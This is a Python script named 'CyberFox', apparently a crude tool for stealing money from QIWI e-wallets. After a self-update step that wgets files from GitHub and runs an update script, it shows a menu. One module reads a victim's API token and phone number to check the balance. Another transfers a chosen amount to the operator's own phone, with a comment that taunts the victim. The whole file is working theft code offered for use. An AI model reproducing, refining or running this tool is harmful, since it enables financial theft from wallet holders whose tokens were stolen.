import os
import time
import requests
import sys
from termcolor import colored, cprint
from SimpleQIWI import *
import filecmp
import webbrowser 

#https://github.com/DarkGa/CyberFox
print(colored("check new version", 'green'))
time.sleep(5)
os.system("mkdir update_check")
os.system("cd $HOME/CyberFox/update_check && wget https://raw.githubusercontent.com/DarkGa/CyberFox/master/ver.txt")
update = filecmp.cmp('../CyberFox/ver.txt', '../CyberFox/update_check/ver.txt')
os.system("cd $HOME && cd CyberFox")
os.system("rm -rf update_check")
os.system("clear")
print(colored("check new version", 'blue'))
time.sleep(3)
if update == True:
	os.system("clear")
	print(colored("you use last version", 'blue'))
if update == False:
	os.system("clear")
	print(colored("detect new version!", 'blue'))
	time.sleep(3)
	os.system("cp update.py $HOME")
	
	os.system("cd $HOME && python3 update.py")
	
	print("run CyberFox!")
	time.sleep(3)

os.system("clear")
print(colored("$$$$$$\\             $$\\                                 $$$$$$$$\\  $$$$$$\\  $$\\   $$\\", 'green'))
print(colored('$$  __$$\           $$ |                                $$  _____|$$  __$$\ $$ |  $$ |', 'green'))
print(colored('$$ /  \__|$$\   $$\ $$$$$$$\   $$$$$$\   $$$$$$\        $$ |      $$ /  $$ |\$$\ $$  |', 'green'))
print(colored('$$ |      $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\       $$$$$\    $$ |  $$ | \$$$$  / ', 'green'))
print(colored('$$ |      $$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|      $$  __|   $$ |  $$ | $$  $$<  ', 'green'))
print(colored('$$ |  $$\ $$ |  $$ |$$ |  $$ |$$   ____|$$ |            $$ |      $$ |  $$ |$$  /\$$\ ', 'green'))
print(colored('\$$$$$$  |\$$$$$$$ |$$$$$$$  |\$$$$$$$\ $$ |            $$ |       $$$$$$  |$$ /  $$ |', 'green'))
print(colored(' \______/  \____$$ |\_______/  \_______|\__|            \__|       \______/ \__|  \__|', 'green'))
print(colored('          $$\   $$ |                                                                  ', 'green'))
print(colored('          \$$$$$$  |                                                                  ', 'green'))
print(colored('           \______/                                                                    ', 'green'))
print('')
print('')
time.sleep(5)

print(colored("=hacker by DarkGamer, official group: CyberFox", 'blue'))
print(colored("|", 'red'))
print(colored("=version 1.0", 'blue'))
print("")
print("")
print("")
print("")
print("")
print("")
      


text = input(colored('kbf> ', 'red'))
I ="use checker"
T ="use hack"
G ="show optinals"

if text == G:
	print("")
	print("")
	print("")
	
	print(colored("=  modules:",  'green'))
	print(colored("|", 'blue'))
	print("=  use hack — hack QIWI ")
	print(colored("|", 'blue'))
	print("=  use checker — chek money to QIWI")
	print('')
	print('')
	print('')
	
	text = input(colored('kbf> ', 'red'))
	
if text == I:
	
	time.sleep(5)
	print("")
	print("")
	print("")

	token=input(colored('[cheker modules]>>', 'red') + colored('set token: ', 'blue'))

	phone=input(colored('[cheker modules]>>', 'red') + colored('set phone hack: ', 'blue'));

	api = QApi(token=token, phone=phone)

	print(colored('complete', 'green'))

	print(api.balance)

	input()
	
elif text == T:
	
	print("DarkHacker") 
	
	time.sleep(5)
	print("")
	print("")
	print("")

	token=input(colored('[hack modules]>>', 'red') + colored('set token: ', 'blue'))

	phone=input(colored('[hack modules]>>', 'red') + colored('set phone hack: ', 'blue'));

	api = QApi(token=token, phone=phone)

	print(colored('complete', 'green'))

	print(api.balance)
	
	your_phone=int(input(colored('[hack modules]>>', 'red') + colored('your phone: ', 'blue')))
	
	money=int(input(colored('[hack modules]>>', 'red') + colored('hack money: ', 'blue')))
	
	api.pay(account=your_phone, amount=money, comment='сорри бро, что спиздил твои бабки')

	print(api.balance)

	input()
    
    
    
    
    
